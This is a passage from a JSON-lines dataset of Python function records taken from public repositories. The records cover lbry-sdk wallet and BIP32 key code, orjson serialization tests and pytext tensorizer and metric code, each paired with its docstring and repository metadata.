{"docstring": "\"\"\"A SOCKS proxy at an address following a SOCKS protocol.  auth is an\nauthentication method to use when connecting, or None.\n\naddress is a (host, port) pair; for IPv6 it can instead be a\n(host, port, flowinfo, scopeid) 4-tuple.\n\"\"\"\n", "func_signal": "def __init__(self, address, protocol, auth):\n", "code": "self.address = address\nself.protocol = protocol\nself.auth = auth\n# Set on each successful connection via the proxy to the\n# result of socket.getpeername()\nself.peername = None", "path": "lbry-sdk/lbry/wallet/rpc/socks.py", "commit_date": "2020-01-01 00:00:00", "repo_name": "lbryio/lbry-sdk", "stars": 7193, "license": "mit", "language": "python", "size": 23759}
{"docstring": "# this checks that factory function correctly sets up the script\n", "func_signal": "def pay_pubkey_hash(self, pubkey_hash):\n", "code": "src1 = OutputScript.pay_pubkey_hash(unhexlify(pubkey_hash))\nself.assertEqual(src1.template.name, 'pay_pubkey_hash')\nself.assertEqual(hexlify(src1.values['pubkey_hash']), pubkey_hash)\n# now we test that it will round trip\nsrc2 = OutputScript(src1.source)\nself.assertEqual(src2.template.name, 'pay_pubkey_hash')\nself.assertEqual(hexlify(src2.values['pubkey_hash']), pubkey_hash)\nreturn hexlify(src1.source)", "path": "lbry-sdk/tests/unit/wallet/test_script.py", "commit_date": "2020-01-03 00:00:00", "repo_name": "lbryio/lbry-sdk", "stars": 7193, "license": "mit", "language": "python", "size": 23759}
{"docstring": "\"\"\"Return a PubKey or PrivateKey from an extended key raw bytes.\"\"\"\n", "func_signal": "def _from_extended_key(ledger, ekey):\n", "code": "if not isinstance(ekey, (bytes, bytearray)):\n    raise TypeError('extended key must be raw bytes')\nif len(ekey) != 78:\n    raise ValueError('extended key must have length 78')\n\ndepth = ekey[4]\nn = int.from_bytes(ekey[9:13], 'big')\nchain_code = ekey[13:45]\n\nif ekey[:4] == ledger.extended_public_key_prefix:\n    pubkey = ekey[45:]\n    key = PubKey(ledger, pubkey, chain_code, n, depth)\nelif ekey[:4] == ledger.extended_private_key_prefix:\n    if ekey[45] != 0:\n        raise ValueError('invalid extended private key prefix byte')\n    privkey = ekey[46:]\n    key = PrivateKey(ledger, privkey, chain_code, n, depth)\nelse:\n    raise ValueError('version bytes unrecognised')\n\nreturn key", "path": "lbry-sdk/lbry/wallet/bip32.py", "commit_date": "2020-01-03 00:00:00", "repo_name": "lbryio/lbry-sdk", "stars": 7193, "license": "mit", "language": "python", "size": 23759}
{"docstring": "\"\"\" Converts a 33-byte compressed pubkey into an PublicKey object. \"\"\"\n", "func_signal": "def _verifying_key_from_pubkey(cls, pubkey):\n", "code": "if not isinstance(pubkey, (bytes, bytearray)):\n    raise TypeError('pubkey must be raw bytes')\nif len(pubkey) != 33:\n    raise ValueError('pubkey must be 33 bytes')\nif pubkey[0] not in (2, 3):\n    raise ValueError('invalid pubkey prefix byte')\nreturn PublicKey(pubkey)", "path": "lbry-sdk/lbry/wallet/bip32.py", "commit_date": "2020-01-03 00:00:00", "repo_name": "lbryio/lbry-sdk", "stars": 7193, "license": "mit", "language": "python", "size": 23759}
{"docstring": "\"\"\" Converts an integer to a big-endian sequence of bytes. \"\"\"\n", "func_signal": "def int_to_bytes(value):\n", "code": "length = (value.bit_length() + 7) // 8\ns = '%x' % value\nreturn unhexlify(('0' * (len(s) % 2) + s).zfill(length * 2))", "path": "lbry-sdk/lbry/crypto/util.py", "commit_date": "2020-01-01 00:00:00", "repo_name": "lbryio/lbry-sdk", "stars": 7193, "license": "mit", "language": "python", "size": 23759}
{"docstring": "\"\"\"Return a raw extended private key.\"\"\"\n", "func_signal": "def extended_key(self):\n", "code": "return self._extended_key(\n    self.ledger.extended_private_key_prefix,\n    b'\\0' + self.private_key_bytes\n)", "path": "lbry-sdk/lbry/wallet/bip32.py", "commit_date": "2020-01-03 00:00:00", "repo_name": "lbryio/lbry-sdk", "stars": 7193, "license": "mit", "language": "python", "size": 23759}
{"docstring": "\"\"\" Return the derived child extended private key at index N.\"\"\"\n", "func_signal": "def child(self, n):\n", "code": "if not 0 <= n < (1 << 32):\n    raise ValueError('invalid BIP32 private key child number')\n\nif n >= self.HARDENED:\n    serkey = b'\\0' + self.private_key_bytes\nelse:\n    serkey = self.public_key.pubkey_bytes\n\nmsg = serkey + n.to_bytes(4, 'big')\nL_b, R_b = self._hmac_sha512(msg)  # pylint: disable=invalid-name\nderived_key = self.signing_key.add(L_b)\nreturn PrivateKey(self.ledger, derived_key, R_b, n, self.depth + 1, self)", "path": "lbry-sdk/lbry/wallet/bip32.py", "commit_date": "2020-01-03 00:00:00", "repo_name": "lbryio/lbry-sdk", "stars": 7193, "license": "mit", "language": "python", "size": 23759}
{"docstring": "\"\"\" Returns the position of the highest bit set plus one. \"\"\"\n", "func_signal": "def bits(self) -> int:\n", "code": "bits = bin(self._value)[2:]\nfor i, d in enumerate(bits):\n    if d:\n        return (len(bits) - i) + 1\nreturn 0", "path": "lbry-sdk/lbry/wallet/util.py", "commit_date": "2020-03-26 00:00:00", "repo_name": "lbryio/lbry-sdk", "stars": 7193, "license": "mit", "language": "python", "size": 23759}
{"docstring": "\"\"\" Return the private key as a secret exponent if it is a valid private key. \"\"\"\n", "func_signal": "def _private_key_secret_exponent(cls, private_key):\n", "code": "if not isinstance(private_key, (bytes, bytearray)):\n    raise TypeError('private key must be raw bytes')\nif len(private_key) != 32:\n    raise ValueError('private key must be 32 bytes')\nreturn int.from_bytes(private_key, 'big')", "path": "lbry-sdk/lbry/wallet/bip32.py", "commit_date": "2020-01-03 00:00:00", "repo_name": "lbryio/lbry-sdk", "stars": 7193, "license": "mit", "language": "python", "size": 23759}
{"docstring": "\"\"\"Attempts to open a socket to server:port and returns True if successful.\"\"\"\n", "func_signal": "def check_connection(server=\"lbry.com\", port=80, timeout=5) -> bool:\n", "code": "log.debug('Checking connection to %s:%s', server, port)\ntry:\n    server = socket.gethostbyname(server)\n    socket.create_connection((server, port), timeout).close()\n    return True\nexcept (socket.gaierror, socket.herror):\n    log.debug(\"Failed to connect to %s:%s. Unable to resolve domain. Trying to bypass DNS\",\n              server, port)\n    try:\n        server = \"8.8.8.8\"\n        port = 53\n        socket.create_connection((server, port), timeout).close()\n        return True\n    except OSError:\n        return False\nexcept OSError:\n    return False", "path": "lbry-sdk/lbry/utils.py", "commit_date": "2020-12-24 00:00:00", "repo_name": "lbryio/lbry-sdk", "stars": 7193, "license": "mit", "language": "python", "size": 23759}
{"docstring": "\"\"\" Return the corresponding extended public key. \"\"\"\n", "func_signal": "def public_key(self):\n", "code": "verifying_key = self.signing_key.public_key\nparent_pubkey = self.parent.public_key if self.parent else None\nreturn PubKey(self.ledger, verifying_key, self.chain_code, self.n, self.depth,\n              parent_pubkey)", "path": "lbry-sdk/lbry/wallet/bip32.py", "commit_date": "2020-01-03 00:00:00", "repo_name": "lbryio/lbry-sdk", "stars": 7193, "license": "mit", "language": "python", "size": 23759}
{"docstring": "# this checks that factory function correctly sets up the script\n", "func_signal": "def pay_claim_name_pubkey_hash(self, name, claim, pubkey_hash):\n", "code": "src1 = OutputScript.pay_claim_name_pubkey_hash(\n    name, unhexlify(claim), unhexlify(pubkey_hash))\nself.assertEqual(src1.template.name, 'claim_name+pay_pubkey_hash')\nself.assertEqual(src1.values['claim_name'], name)\nself.assertEqual(hexlify(src1.values['claim']), claim)\nself.assertEqual(hexlify(src1.values['pubkey_hash']), pubkey_hash)\n# now we test that it will round trip\nsrc2 = OutputScript(src1.source)\nself.assertEqual(src2.template.name, 'claim_name+pay_pubkey_hash')\nself.assertEqual(src2.values['claim_name'], name)\nself.assertEqual(hexlify(src2.values['claim']), claim)\nself.assertEqual(hexlify(src2.values['pubkey_hash']), pubkey_hash)\nreturn hexlify(src1.source)", "path": "lbry-sdk/tests/unit/wallet/test_script.py", "commit_date": "2020-01-03 00:00:00", "repo_name": "lbryio/lbry-sdk", "stars": 7193, "license": "mit", "language": "python", "size": 23759}
{"docstring": "\"\"\" Use SHA-512 to provide an HMAC, returned as a pair of 32-byte objects. \"\"\"\n", "func_signal": "def _hmac_sha512(self, msg):\n", "code": "hmac = hmac_sha512(self.chain_code, msg)\nreturn hmac[:32], hmac[32:]", "path": "lbry-sdk/lbry/wallet/bip32.py", "commit_date": "2020-01-03 00:00:00", "repo_name": "lbryio/lbry-sdk", "stars": 7193, "license": "mit", "language": "python", "size": 23759}
{"docstring": "# This hard-coded message string seems to be coin-independent...\n", "func_signal": "def from_seed(cls, ledger, seed):\n", "code": "hmac = hmac_sha512(b'Bitcoin seed', seed)\nprivkey, chain_code = hmac[:32], hmac[32:]\nreturn cls(ledger, privkey, chain_code, 0, 0)", "path": "lbry-sdk/lbry/wallet/bip32.py", "commit_date": "2020-01-03 00:00:00", "repo_name": "lbryio/lbry-sdk", "stars": 7193, "license": "mit", "language": "python", "size": 23759}
{"docstring": "\"\"\"\nint 128-bit\n\"\"\"\n", "func_signal": "def test_int_128(self):\n", "code": "for val in (18446744073709551616, -9223372036854775809):\n    self.assertRaises(orjson.JSONEncodeError, orjson.dumps, val)", "path": "orjson/test/test_type.py", "commit_date": "2020-12-02 00:00:00", "repo_name": "ijl/orjson", "stars": 5390, "license": "apache-2.0", "language": "python", "size": 4746}
{"docstring": "\"\"\"\ndict with keys too large to cache\n\"\"\"\n", "func_signal": "def test_dict_large_keys(self):\n", "code": "obj = {\n    \"keeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeey\": \"value\"\n}\nref = '{\"keeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeey\":\"value\"}'\nself.assertEqual(orjson.dumps(obj), ref.encode(\"utf-8\"))\nself.assertEqual(orjson.loads(ref), obj)", "path": "orjson/test/test_type.py", "commit_date": "2020-12-02 00:00:00", "repo_name": "ijl/orjson", "stars": 5390, "license": "apache-2.0", "language": "python", "size": 4746}
{"docstring": "\"\"\"\nfloat\n\"\"\"\n", "func_signal": "def test_float(self):\n", "code": "self.assertEqual(-1.1234567893, orjson.loads(\"-1.1234567893\"))\nself.assertEqual(-1.234567893, orjson.loads(\"-1.234567893\"))\nself.assertEqual(-1.34567893, orjson.loads(\"-1.34567893\"))\nself.assertEqual(-1.4567893, orjson.loads(\"-1.4567893\"))\nself.assertEqual(-1.567893, orjson.loads(\"-1.567893\"))\nself.assertEqual(-1.67893, orjson.loads(\"-1.67893\"))\nself.assertEqual(-1.7893, orjson.loads(\"-1.7893\"))\nself.assertEqual(-1.893, orjson.loads(\"-1.893\"))\nself.assertEqual(-1.3, orjson.loads(\"-1.3\"))\n\nself.assertEqual(1.1234567893, orjson.loads(\"1.1234567893\"))\nself.assertEqual(1.234567893, orjson.loads(\"1.234567893\"))\nself.assertEqual(1.34567893, orjson.loads(\"1.34567893\"))\nself.assertEqual(1.4567893, orjson.loads(\"1.4567893\"))\nself.assertEqual(1.567893, orjson.loads(\"1.567893\"))\nself.assertEqual(1.67893, orjson.loads(\"1.67893\"))\nself.assertEqual(1.7893, orjson.loads(\"1.7893\"))\nself.assertEqual(1.893, orjson.loads(\"1.893\"))\nself.assertEqual(1.3, orjson.loads(\"1.3\"))", "path": "orjson/test/test_type.py", "commit_date": "2020-12-02 00:00:00", "repo_name": "ijl/orjson", "stars": 5390, "license": "apache-2.0", "language": "python", "size": 4746}
{"docstring": "\"\"\"\nloads() similar keys\n\nThis was a regression in 3.4.2 caused by using\nthe implementation in wy instead of wyhash.\n\"\"\"\n", "func_signal": "def test_dict_similar_keys(self):\n", "code": "self.assertEqual(\n    orjson.loads(\n        '{\"cf_status_firefox67\": \"---\", \"cf_status_firefox57\": \"verified\"}'\n    ),\n    {\"cf_status_firefox57\": \"verified\", \"cf_status_firefox67\": \"---\"},\n)", "path": "orjson/test/test_type.py", "commit_date": "2020-12-02 00:00:00", "repo_name": "ijl/orjson", "stars": 5390, "license": "apache-2.0", "language": "python", "size": 4746}
{"docstring": "\"\"\"\nint 64-bit\n\"\"\"\n", "func_signal": "def test_int_64(self):\n", "code": "for val in (9223372036854775807, -9223372036854775807):\n    self.assertEqual(orjson.loads(str(val)), val)\n    self.assertEqual(orjson.dumps(val), str(val).encode(\"utf-8\"))", "path": "orjson/test/test_type.py", "commit_date": "2020-12-02 00:00:00", "repo_name": "ijl/orjson", "stars": 5390, "license": "apache-2.0", "language": "python", "size": 4746}
{"docstring": "\"\"\"\nfloat edge cases\n\"\"\"\n", "func_signal": "def test_float_edge(self):\n", "code": "self.assertEqual(orjson.dumps(0.8701), b\"0.8701\")\n\nself.assertEqual(orjson.loads(\"0.8701\"), 0.8701)\nself.assertEqual(\n    orjson.loads(\"0.0000000000000000000000000000000000000000000000000123e50\"),\n    1.23,\n)\nself.assertEqual(orjson.loads(\"0.4e5\"), 40000.0)\nself.assertEqual(orjson.loads(\"0.00e-00\"), 0.0)\nself.assertEqual(orjson.loads(\"0.4e-001\"), 0.04)\nself.assertEqual(orjson.loads(\"0.123456789e-12\"), 1.23456789e-13)\nself.assertEqual(orjson.loads(\"1.234567890E+34\"), 1.23456789e34)\nself.assertEqual(orjson.loads(\"23456789012E66\"), 2.3456789012e76)", "path": "orjson/test/test_type.py", "commit_date": "2020-12-02 00:00:00", "repo_name": "ijl/orjson", "stars": 5390, "license": "apache-2.0", "language": "python", "size": 4746}
{"docstring": "\"\"\"\nuint 64-bit\n\"\"\"\n", "func_signal": "def test_uint_64(self):\n", "code": "for val in (0, 9223372036854775808, 18446744073709551615):\n    self.assertEqual(orjson.loads(str(val)), val)\n    self.assertEqual(orjson.dumps(val), str(val).encode(\"utf-8\"))", "path": "orjson/test/test_type.py", "commit_date": "2020-12-02 00:00:00", "repo_name": "ijl/orjson", "stars": 5390, "license": "apache-2.0", "language": "python", "size": 4746}
{"docstring": "\"\"\"\nnull array\n\"\"\"\n", "func_signal": "def test_null_array(self):\n", "code": "obj = [None] * 256\nref = (\"[\" + (\"null,\" * 255) + \"null]\").encode(\"utf-8\")\nself.assertEqual(orjson.dumps(obj), ref)\nself.assertEqual(orjson.loads(ref), obj)", "path": "orjson/test/test_type.py", "commit_date": "2020-12-02 00:00:00", "repo_name": "ijl/orjson", "stars": 5390, "license": "apache-2.0", "language": "python", "size": 4746}
{"docstring": "\"\"\"\ndict invalid key loads()\n\"\"\"\n", "func_signal": "def test_dict_invalid_key_loads(self):\n", "code": "with self.assertRaises(orjson.JSONDecodeError):\n    orjson.loads('{1:\"value\"}')\nwith self.assertRaises(orjson.JSONDecodeError):\n    orjson.loads('{{\"a\":true}:true}')", "path": "orjson/test/test_type.py", "commit_date": "2020-12-02 00:00:00", "repo_name": "ijl/orjson", "stars": 5390, "license": "apache-2.0", "language": "python", "size": 4746}
{"docstring": "\"\"\"\nfloat notation\n\"\"\"\n", "func_signal": "def test_float_notation(self):\n", "code": "for val in (\"1.337E40\", \"1.337e+40\", \"1337e40\", \"1.337E-4\"):\n    obj = orjson.loads(val)\n    self.assertEqual(obj, float(val))\n    self.assertEqual(orjson.dumps(val), ('\"%s\"' % val).encode(\"utf-8\"))", "path": "orjson/test/test_type.py", "commit_date": "2020-12-02 00:00:00", "repo_name": "ijl/orjson", "stars": 5390, "license": "apache-2.0", "language": "python", "size": 4746}
{"docstring": "\"\"\"\nstr unicode surrogates dumps()\n\"\"\"\n", "func_signal": "def test_str_surrogates_dumps(self):\n", "code": "self.assertRaises(orjson.JSONEncodeError, orjson.dumps, \"\\ud800\")\nself.assertRaises(orjson.JSONEncodeError, orjson.dumps, \"\\ud83d\\ude80\")\nself.assertRaises(orjson.JSONEncodeError, orjson.dumps, \"\\udcff\")\nself.assertRaises(orjson.JSONEncodeError, orjson.dumps, {\"\\ud83d\\ude80\": None})\nself.assertRaises(\n    orjson.JSONEncodeError, orjson.dumps, b\"\\xed\\xa0\\xbd\\xed\\xba\\x80\"\n)  # \\ud83d\\ude80", "path": "orjson/test/test_type.py", "commit_date": "2020-12-02 00:00:00", "repo_name": "ijl/orjson", "stars": 5390, "license": "apache-2.0", "language": "python", "size": 4746}
{"docstring": "\"\"\"\nstr unicode surrogates loads()\n\"\"\"\n", "func_signal": "def test_str_surrogates_loads(self):\n", "code": "self.assertRaises(orjson.JSONDecodeError, orjson.loads, '\"\\ud800\"')\nself.assertRaises(orjson.JSONDecodeError, orjson.loads, '\"\\ud83d\\ude80\"')\nself.assertRaises(orjson.JSONDecodeError, orjson.loads, '\"\\udcff\"')\nself.assertRaises(\n    orjson.JSONDecodeError, orjson.loads, b'\"\\xed\\xa0\\xbd\\xed\\xba\\x80\"'\n)  # \\ud83d\\ude80", "path": "orjson/test/test_type.py", "commit_date": "2020-12-02 00:00:00", "repo_name": "ijl/orjson", "stars": 5390, "license": "apache-2.0", "language": "python", "size": 4746}
{"docstring": "\"\"\"\norjson.JSONDecodeError on invalid\n\"\"\"\n", "func_signal": "def test_invalid(self):\n", "code": "for val in ('{\"age\", 44}', \"[31337,]\", \"[,31337]\", \"[]]\", \"[,]\"):\n    self.assertRaises(orjson.JSONDecodeError, orjson.loads, val)", "path": "orjson/test/test_type.py", "commit_date": "2020-12-02 00:00:00", "repo_name": "ijl/orjson", "stars": 5390, "license": "apache-2.0", "language": "python", "size": 4746}
{"docstring": "\"\"\"\nint 53-bit\n\"\"\"\n", "func_signal": "def test_int_53(self):\n", "code": "for val in (9007199254740991, -9007199254740991):\n    self.assertEqual(orjson.loads(str(val)), val)\n    self.assertEqual(\n        orjson.dumps(val, option=orjson.OPT_STRICT_INTEGER),\n        str(val).encode(\"utf-8\"),\n    )", "path": "orjson/test/test_type.py", "commit_date": "2020-12-02 00:00:00", "repo_name": "ijl/orjson", "stars": 5390, "license": "apache-2.0", "language": "python", "size": 4746}
{"docstring": "\"\"\"\nstr long enough to trigger overflow in bytecount\n\"\"\"\n", "func_signal": "def test_str_very_long(self):\n", "code": "for obj in (\"aaaa\" * 20000, \"\u00fc\u00fd\u00fe\u00ff\" * 20000, \"\u597d\" * 20000, \"\ufffd\" * 20000):\n    self.assertEqual(orjson.loads(orjson.dumps(obj)), obj)", "path": "orjson/test/test_type.py", "commit_date": "2020-12-02 00:00:00", "repo_name": "ijl/orjson", "stars": 5390, "license": "apache-2.0", "language": "python", "size": 4746}
{"docstring": "\"\"\"\nNaN is not valid JSON\n\"\"\"\n", "func_signal": "def test_nan_loads(self):\n", "code": "with self.assertRaises(orjson.JSONDecodeError):\n    orjson.loads(\"[NaN]\")\nwith self.assertRaises(orjson.JSONDecodeError):\n    orjson.loads(\"[nan]\")", "path": "orjson/test/test_type.py", "commit_date": "2020-12-02 00:00:00", "repo_name": "ijl/orjson", "stars": 5390, "license": "apache-2.0", "language": "python", "size": 4746}
{"docstring": "\"\"\"\nbool false array\n\"\"\"\n", "func_signal": "def test_bool_false_array(self):\n", "code": "obj = [False] * 256\nref = (\"[\" + (\"false,\" * 255) + \"false]\").encode(\"utf-8\")\nself.assertEqual(orjson.dumps(obj), ref)\nself.assertEqual(orjson.loads(ref), obj)", "path": "orjson/test/test_type.py", "commit_date": "2020-12-02 00:00:00", "repo_name": "ijl/orjson", "stars": 5390, "license": "apache-2.0", "language": "python", "size": 4746}
{"docstring": "\"\"\"\nInfinity, -Infinity is not valid JSON\n\"\"\"\n", "func_signal": "def test_infinity_loads(self):\n", "code": "with self.assertRaises(orjson.JSONDecodeError):\n    orjson.loads(\"[infinity]\")\nwith self.assertRaises(orjson.JSONDecodeError):\n    orjson.loads(\"[Infinity]\")\nwith self.assertRaises(orjson.JSONDecodeError):\n    orjson.loads(\"[-Infinity]\")\nwith self.assertRaises(orjson.JSONDecodeError):\n    orjson.loads(\"[-infinity]\")", "path": "orjson/test/test_type.py", "commit_date": "2020-12-02 00:00:00", "repo_name": "ijl/orjson", "stars": 5390, "license": "apache-2.0", "language": "python", "size": 4746}
{"docstring": "\"\"\"\nbool true array\n\"\"\"\n", "func_signal": "def test_bool_true_array(self):\n", "code": "obj = [True] * 256\nref = (\"[\" + (\"true,\" * 255) + \"true]\").encode(\"utf-8\")\nself.assertEqual(orjson.dumps(obj), ref)\nself.assertEqual(orjson.loads(ref), obj)", "path": "orjson/test/test_type.py", "commit_date": "2020-12-02 00:00:00", "repo_name": "ijl/orjson", "stars": 5390, "license": "apache-2.0", "language": "python", "size": 4746}
{"docstring": "\"\"\"\nint 53-bit exception on 64-bit\n\"\"\"\n", "func_signal": "def test_int_53_exc(self):\n", "code": "for val in (9007199254740992, -9007199254740992):\n    with self.assertRaises(orjson.JSONEncodeError):\n        orjson.dumps(val, option=orjson.OPT_STRICT_INTEGER)", "path": "orjson/test/test_type.py", "commit_date": "2020-12-02 00:00:00", "repo_name": "ijl/orjson", "stars": 5390, "license": "apache-2.0", "language": "python", "size": 4746}
{"docstring": "# for backward compatibility\n", "func_signal": "def __setstate__(self, newstate):\n", "code": "if \"pad_missing\" not in newstate:\n    newstate[\"pad_missing\"] = True\nself.__dict__.update(newstate)", "path": "pytext/pytext/data/tensorizers.py", "commit_date": "2020-12-16 00:00:00", "repo_name": "facebookresearch/pytext", "stars": 6351, "license": "other", "language": "python", "size": 8448}
{"docstring": "# Pad a minibatch of dictionary features to be\n# batch_size * max_number_of_words * max_number_of_features\n# unpack the minibatch\n", "func_signal": "def tensorize(self, batch):\n", "code": "feats, weights, lengths = zip(*batch)\nlengths_flattened = [l for l_list in lengths for l in l_list]\nseq_lens = [len(l_list) for l_list in lengths]\nmax_ex_len = precision.pad_length(max(seq_lens))\nmax_feat_len = max(lengths_flattened)\nall_lengths, all_feats, all_weights = [], [], []\nfor i, seq_len in enumerate(seq_lens):\n    ex_feats, ex_weights, ex_lengths = [], [], []\n    feats_lengths, feats_vals, feats_weights = lengths[i], feats[i], weights[i]\n    max_feat_len_example = max(feats_lengths)\n    r_offset = 0\n    for _ in feats_lengths:\n        # The dict feats obtained from the featurizer will have necessary\n        # padding at the utterance level. Therefore we move the offset by\n        # max feature length in the example.\n        ex_feats.extend(feats_vals[r_offset : r_offset + max_feat_len_example])\n        ex_feats.extend(\n            [self.vocab.get_pad_index()] * (max_feat_len - max_feat_len_example)\n        )\n        ex_weights.extend(\n            feats_weights[r_offset : r_offset + max_feat_len_example]\n        )\n        ex_weights.extend([0.0] * (max_feat_len - max_feat_len_example))\n        r_offset += max_feat_len_example\n    ex_lengths.extend(feats_lengths)\n    # Pad examples\n    ex_padding = (max_ex_len - seq_len) * max_feat_len\n    ex_feats.extend([self.vocab.get_pad_index()] * ex_padding)\n    ex_weights.extend([0.0] * ex_padding)\n    ex_lengths.extend([1] * (max_ex_len - seq_len))\n    all_feats.append(ex_feats)\n    all_weights.append(ex_weights)\n    all_lengths.append(ex_lengths)\nreturn (\n    cuda.tensor(all_feats, torch.long),\n    precision.maybe_half(cuda.tensor(all_weights, torch.float)),\n    cuda.tensor(all_lengths, torch.long),\n)", "path": "pytext/pytext/data/tensorizers.py", "commit_date": "2020-12-16 00:00:00", "repo_name": "facebookresearch/pytext", "stars": 6351, "license": "other", "language": "python", "size": 8448}
{"docstring": "\"\"\"\nLook through the dataset for all labels and create a vocab map for them.\n\"\"\"\n", "func_signal": "def initialize(self, from_scratch=True):\n", "code": "if self.vocab and from_scratch:\n    return\ntry:\n    while True:\n        row = yield\n        elem_struct_0 = list(map(json.loads, row[self.label_column]))\n\n        for elemRow in elem_struct_0:\n            self.vocab_builder.add_all(elemRow[0])\nexcept GeneratorExit:\n    if self.add_labels:\n        self.vocab_builder.add_all(self.add_labels)\n    self.vocab, self.pad_idx = self._create_vocab()", "path": "pytext/pytext/data/tensorizers.py", "commit_date": "2020-12-16 00:00:00", "repo_name": "facebookresearch/pytext", "stars": 6351, "license": "other", "language": "python", "size": 8448}
{"docstring": "\"\"\"\nIf set, the dilation factor increases by a factor of two for each\nsuccessive convolution to increase the receptive field exponentially.\n\n\"\"\"\n\n", "func_signal": "def _compute_dilation(index, dilated):\n", "code": "if dilated:\n    return 2 ** index\nreturn 1", "path": "pytext/pytext/models/representations/deepcnn.py", "commit_date": "2020-02-23 00:00:00", "repo_name": "facebookresearch/pytext", "stars": 6351, "license": "other", "language": "python", "size": 8448}
{"docstring": "\"\"\"Build vocabulary based on training corpus.\"\"\"\n", "func_signal": "def initialize(self, vocab_builder=None, from_scratch=True):\n", "code": "if self.vocab and from_scratch:\n    if self.vocab_config.build_from_data or self.vocab_config.vocab_files:\n        print(\n            f\"`{self.text_column}` column: vocab already provided, skipping \"\n            f\"adding tokens from data and from vocab files.\"\n        )\n    return\n\nif not self.vocab_config.build_from_data and not self.vocab_config.vocab_files:\n    raise ValueError(\n        f\"To create token tensorizer for '{self.text_column}', either \"\n        f\"`build_from_data` or `vocab_files` must be set.\"\n    )\nif not self.vocab_builder:\n    # else means not initialize from scratch, self.vocab_builder\n    # would be set already\n    self.vocab_builder = vocab_builder or VocabBuilder(\n        delimiter=self.vocab_file_delimiter\n    )\n    self.vocab_builder.use_bos = self.add_bos_token\n    self.vocab_builder.use_eos = self.add_eos_token\nif not self.vocab_config.build_from_data:\n    self._add_vocab_from_files()\n    self.vocab = self.vocab_builder.make_vocab()\n    return\n\ntry:\n    while True:\n        row = yield\n        raw_text = row[self.text_column]\n        tokenized = self.tokenizer.tokenize(raw_text)\n        self.vocab_builder.add_all([t.value for t in tokenized])\nexcept GeneratorExit:\n    self.vocab_builder.truncate_to_vocab_size(\n        self.vocab_config.size_from_data, self.vocab_config.min_counts\n    )\n    self._add_vocab_from_files()\n    self.vocab = self.vocab_builder.make_vocab()", "path": "pytext/pytext/data/tensorizers.py", "commit_date": "2020-12-16 00:00:00", "repo_name": "facebookresearch/pytext", "stars": 6351, "license": "other", "language": "python", "size": 8448}
{"docstring": "\"\"\"\nGenerate human readable targets\n\"\"\"\n", "func_signal": "def targets_to_report(self):\n", "code": "return [\n    [self.label_names[target] for target in targets if target != -1]\n    for targets in self.all_targets\n]", "path": "pytext/pytext/metric_reporters/classification_metric_reporter.py", "commit_date": "2020-06-23 00:00:00", "repo_name": "facebookresearch/pytext", "stars": 6351, "license": "other", "language": "python", "size": 8448}
{"docstring": "# start reading through data source\n", "func_signal": "def initialize(self, from_scratch=True):\n", "code": "while True:\n    yield", "path": "pytext/pytext/data/tensorizers.py", "commit_date": "2020-12-16 00:00:00", "repo_name": "facebookresearch/pytext", "stars": 6351, "license": "other", "language": "python", "size": 8448}
{"docstring": "\"\"\"Build vocabulary based on training corpus.\"\"\"\n", "func_signal": "def initialize(self):\n", "code": "vocab_builder = VocabBuilder()\n\ntry:\n    while True:\n        row = yield\n        words = self._tokenize(row)\n        vocab_builder.add_all(words)\nexcept GeneratorExit:\n    self.vocab = vocab_builder.make_vocab()", "path": "pytext/demo/examples/tensorizer.py", "commit_date": "2019-10-03 00:00:00", "repo_name": "facebookresearch/pytext", "stars": 6351, "license": "other", "language": "python", "size": 8448}
{"docstring": "\"\"\"Build vocabulary based on training corpus.\"\"\"\n", "func_signal": "def initialize(self, vocab_builder=None, from_scratch=True):\n", "code": "if self.vocab and from_scratch:\n    return\nif not self.vocab_builder:\n    self.vocab_builder = vocab_builder or VocabBuilder()\n    self.vocab_builder.use_unk = False\n    self.vocab_builder.use_pad = False\n\ntry:\n    while True:\n        row = yield\n        annotation = Annotation(row[self.column])\n        actions = annotation.tree.to_actions()\n        self.vocab_builder.add_all(actions)\nexcept GeneratorExit:\n    self.vocab = self.vocab_builder.make_vocab()\n    self.shift_idx = self.vocab.idx[SHIFT]\n    self.reduce_idx = self.vocab.idx[REDUCE]\n\n    def filterVocab(fn):\n        return [token for nt, token in self.vocab.idx.items() if fn(nt)]\n\n    self.ignore_subNTs_roots = filterVocab(is_unsupported)\n    self.valid_NT_idxs = filterVocab(is_valid_nonterminal)\n    self.valid_IN_idxs = filterVocab(is_intent_nonterminal)\n    self.valid_SL_idxs = filterVocab(is_slot_nonterminal)", "path": "pytext/pytext/data/tensorizers.py", "commit_date": "2020-12-16 00:00:00", "repo_name": "facebookresearch/pytext", "stars": 6351, "license": "other", "language": "python", "size": 8448}
{"docstring": "# Test single pair\n", "func_signal": "def test_compute_intent_slot_metrics(self) -> None:\n", "code": "self.assertMetricsAlmostEqual(\n    compute_intent_slot_metrics(FRAME_PAIRS[1:2], tree_based=False),\n    IntentSlotMetrics(\n        intent_metrics=PRF1Metrics(\n            per_label_scores={\"intent1\": PRF1Scores(1, 0, 0, 1.0, 1.0, 1.0)},\n            macro_scores=MacroPRF1Scores(1, 1.0, 1.0, 1.0),\n            micro_scores=PRF1Scores(1, 0, 0, 1.0, 1.0, 1.0),\n        ),\n        slot_metrics=PRF1Metrics(\n            per_label_scores={\"slot1\": PRF1Scores(0, 0, 1, 0.0, 0.0, 0.0)},\n            macro_scores=MacroPRF1Scores(1, 0.0, 0.0, 0.0),\n            micro_scores=PRF1Scores(0, 0, 1, 0.0, 0.0, 0.0),\n        ),\n        overall_metrics=PRF1Scores(1, 0, 1, 1.0, 0.5, 2.0 / 3),\n    ),\n)\nself.assertMetricsAlmostEqual(\n    compute_intent_slot_metrics(FRAME_PAIRS[1:2], tree_based=True),\n    IntentSlotMetrics(\n        intent_metrics=PRF1Metrics(\n            per_label_scores={\"intent1\": PRF1Scores(0, 1, 1, 0.0, 0.0, 0.0)},\n            macro_scores=MacroPRF1Scores(1, 0.0, 0.0, 0.0),\n            micro_scores=PRF1Scores(0, 1, 1, 0.0, 0.0, 0.0),\n        ),\n        slot_metrics=PRF1Metrics(\n            per_label_scores={\"slot1\": PRF1Scores(0, 0, 1, 0.0, 0.0, 0.0)},\n            macro_scores=MacroPRF1Scores(1, 0.0, 0.0, 0.0),\n            micro_scores=PRF1Scores(0, 0, 1, 0.0, 0.0, 0.0),\n        ),\n        overall_metrics=PRF1Scores(0, 1, 2, 0.0, 0.0, 0.0),\n  